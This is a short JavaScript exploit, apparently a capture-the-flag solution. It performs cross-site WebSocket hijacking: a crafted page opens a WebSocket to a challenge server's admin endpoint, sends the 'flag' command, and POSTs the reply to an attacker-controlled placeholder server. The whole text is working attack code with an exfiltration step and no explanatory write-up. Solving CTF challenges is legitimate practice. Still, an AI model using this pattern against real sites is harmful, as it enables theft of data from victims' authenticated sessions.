// JavaScript to include on your crafted page
var ws = new WebSocket('ws://chall.polygl0ts.ch:9010/admin/ws'); // WebSocket connection to the server's admin endpoint

ws.onopen = function() {
    // Connection is open, send the 'flag' command
    ws.send('flag');
};

ws.onmessage = function(event) {
    // Message received from the server, likely the flag if the command was successful
    var flag = event.data;

    // Exfiltrate the flag to your endpoint
    fetch('http://your-server-to-receive-flag.com/', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({flag: flag})
    });

    ws.close(); // Close the WebSocket connection after receiving the flag
};
